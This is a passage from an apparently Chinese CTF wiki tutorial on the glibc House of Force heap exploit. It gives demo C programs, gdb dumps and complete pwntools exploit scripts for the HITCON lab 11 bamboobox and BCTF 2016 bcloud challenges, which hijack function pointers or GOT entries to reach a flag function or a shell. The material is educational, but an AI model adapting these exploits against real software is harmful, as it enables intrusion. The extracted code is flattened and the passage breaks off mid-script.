chunk\u88ab\u62ac\u9ad8\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002\n\n\n    \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n            \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n\n\n\n\n\u7b80\u5355\u793a\u4f8b2\n\n\n\u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c\n\u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9\n\n\nint main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;                 \n=== \u4fee\u6539top chunk size\n    malloc(140737345551056); \n=== \u589e\u5927top chunk\u6307\u9488\n    malloc(0x10);\n}\n\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002\n\u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002\n\u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97\n\n\n0x7ffff7dd1b00-0x602020-0x10=140737345551056\n\u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00\n\n\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50 \nmain_arena+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60 \nmain_arena+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70 \nmain_arena+80\n: 0x0000000000000000  0x00007ffff7dd1b00 \n=== top chunk\n0x7ffff7dd1b80 \nmain_arena+96\n: 0x0000000000000000  0x00007ffff7dd1b78\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86\n\n\nrax = 0x00007ffff7dd1b10\n\n0x400562 \nmain+60\n        mov    edi, 0x10\n0x400567 \nmain+65\n        call   0x400410 \nmalloc@plt\n\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002\n\n\n\n\n\u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002\n\n\n\u5176\u6b21\uff0c\n\u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f\n\n\n\u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236\n\n\n\n\n\u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002\n\n\nHITCON training lab 11\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraning_lab11 git:\n(\nmaster\n)\n file bamboobox     \nbamboobox: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped\n\u279c  hitcontraning_lab11 git:\n(\nmaster\n)\n checksec bamboobox \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 \u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 \u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559\n\u4e24\u4e2a\u51fd\u6570\u6307\u9488\n\u3002\n\n\n\u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664\n\n\n\n\n\u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002\n\n\n\u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f \nread\n \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3\nREQUEST_OUT_OF_RANGE\n \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728\n\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\n\u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002\n\n\n\u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728\n\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\n\u7684\u6f0f\u6d1e\u3002\n\n\n\u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002\n\n\n\u5229\u7528\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002\n\n\n\u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002\n\n\n\u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002\n\n\nexp \u5982\u4e0b\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\nfrom pwn import *\n\n\nr\n \n=\n process\n(\n./bamboobox\n)\n\ncontext.log_level \n=\n \ndebug\n\n\n\ndef additem\n(\nlength, name\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n2\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nlength\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nname\n)\n\n\n\ndef modify\n(\nidx, length, name\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n3\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nidx\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nlength\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nname\n)\n\n\n\ndef remove\n(\nidx\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n4\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nidx\n))\n\n\n\ndef show\n()\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n1\n)\n\n\n\n\nmagic\n \n=\n 0x400d49\n\n# we must alloc enough size, so as to successfully alloc from fake topchunk\n\nadditem\n(\n0x30, \nddaa\n)\n  \n# idx 0\n\n\npayload\n \n=\n 0x30 * \na\n  \n# idx 0\ns content\n\n\npayload\n \n+=\n \na\n * \n8\n + p64\n(\n0xffffffffffffffff\n)\n  \n# top chunk\ns prev_size and size\n\n\n# modify topchunk\ns size to -1\n\nmodify\n(\n0\n, 0x41, payload\n)\n\n\n# top chunk\ns offset to heap base\n\n\noffset_to_heap_base\n \n=\n -\n(\n0x40 + 0x20\n)\n\n\nmalloc_size\n \n=\n offset_to_heap_base - 0x8 - 0xf\n\n#gdb.attach(r)\n\nadditem\n(\nmalloc_size, \ndada\n)\n\nadditem\n(\n0x10, p64\n(\nmagic\n)\n * \n2\n)\n\nprint r.recv\n()\n\nr.interactive\n()\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002\n\n\n2016 BCTF bcloud\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2016_bctf_bcloud git:\n(\nmaster\n)\n file bcloud   \nbcloud: ELF \n32\n-bit LSB executable, Intel \n80386\n, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-linux.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped\n\u279c  2016_bctf_bcloud git:\n(\nmaster\n)\n checksec bcloud  \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\n\n\n\n\n\u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002\n\n\n\u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002\n\n\n\u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002\n\n\n\u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002\n\n\n\u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002\n\n\n\n\n\u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002\n\n\n\u521d\u59cb\u5316\u540d\u5b57\n\n\nunsigned\n \nint\n \ninit_name\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [esp+1Ch] [ebp-5Ch]\n\n  \nchar\n \n*\ntmp\n;\n \n// [esp+5Ch] [ebp-1Ch]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+6Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nmemset\n(\ns\n,\n \n0\n,\n \n0x50u\n);\n\n  \nputs\n(\nInput your name:\n);\n\n  \nread_str\n(\ns\n,\n \n64\n,\n \n\\n\n);\n\n  \ntmp\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \nname\n \n=\n \ntmp\n;\n\n  \nstrcpy\n(\ntmp\n,\n \ns\n);\n\n  \ninfo\n(\ntmp\n);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4\n\u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740\n\u3002\u3002\n\n\n\u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e\n\n\nunsigned\n \nint\n \ninit_org_host\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [esp+1Ch] [ebp-9Ch]\n\n  \nchar\n \n*\nv2\n;\n \n// [esp+5Ch] [ebp-5Ch]\n\n  \nchar\n \nv3\n;\n \n// [esp+60h] [ebp-58h]\n\n  \nchar\n \n*\nv4\n;\n \n// [esp+A4h] [ebp-14h]\n\n  \nunsigned\n \nint\n \nv5\n;\n \n// [esp+ACh] [ebp-Ch]\n\n\n  \nv5\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nmemset\n(\ns\n,\n \n0\n,\n \n0x90u\n);\n\n  \nputs\n(\nOrg:\n);\n\n  \nread_str\n(\ns\n,\n \n64\n,\n \n10\n);\n\n  \nputs\n(\nHost:\n);\n\n  \nread_str\n(\nv3\n,\n \n64\n,\n \n10\n);\n\n  \nv4\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \nv2\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \norg\n \n=\n \nv2\n;\n\n  \nhost\n \n=\n \nv4\n;\n\n  \nstrcpy\n(\nv4\n,\n \nv3\n);\n\n  \nstrcpy\n(\nv2\n,\n \ns\n);\n\n  \nputs\n(\nOKay! Enjoy:)\n);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\n\u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f \n\\x00\n \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002\n\n\n\u5229\u7528\n\n\n\n\n\u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002\n\n\n\u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684 \nnotesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\n\n\n\u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got\n\n\n\u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002\n\n\n\u6cc4\u6f0f atoi \u5730\u5740\u3002\n\n\n\u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002\n\n\n\n\n\u5177\u4f53\u811a\u672c\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./bcloud\n\n\nbcloud\n \n=\n \nELF\n(\n./bcloud\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./bcloud\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \noffset_bin_main_arena\n(\nidx\n):\n\n    \nword_bytes\n \n=\n \ncontext\n.\nword_size\n \n/\n \n8\n\n    \noffset\n \n=\n \n4\n  \n# lock\n\n    \noffset\n \n+=\n \n4\n  \n# flags\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n10\n  \n# offset fastbin\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n2\n  \n# top,last_remainder\n\n    \noffset\n \n+=\n \nidx\n \n*\n \n2\n \n*\n \nword_bytes\n  \n# idx\n\n    \noffset\n \n-=\n \nword_bytes\n \n*\n \n2\n  \n# bin overlap\n\n    \nreturn\n \noffset\n\n\n\n\ndef\n \nexp\n():\n\n    \n# leak heap base\n\n    \np\n.\nsendafter\n(\nInput your name:\n\\n\n,\n \na\n \n*\n \n64\n)\n\n    \np\n.\nrecvuntil\n(\nHey \n \n+\n \na\n \n*\n \n64\n)\n\n    \n# sub name\ns chunk\n s header\n\n    \nheap_base\n \n=\n \nu32\n(\np\n.\nrecv\n(\n4\n))\n \n-\n \n8\n\n    \nlog\n.\nsuccess\n(\nheap_base: \n \n+\n \nhex\n(\nheap_base\n))\n\n    \np\n.\nsendafter\n(\nOrg:\n\\n\n,\n \na\n \n*\n \n64\n)\n\n    \np\n.\nsendlineafter\n(\nHost:\n\\n\n,\n \np32\n(\n0xffffffff\n))\n\n    \n# name,org,host, for each is (0x40+8)\n\n    \ntopchunk_addr\n \n=\n \nheap_base\n \n+\n \n(\n0x40\n \n+\n \n8\n)\n \n*\n \n3\n\n\n    \n# make 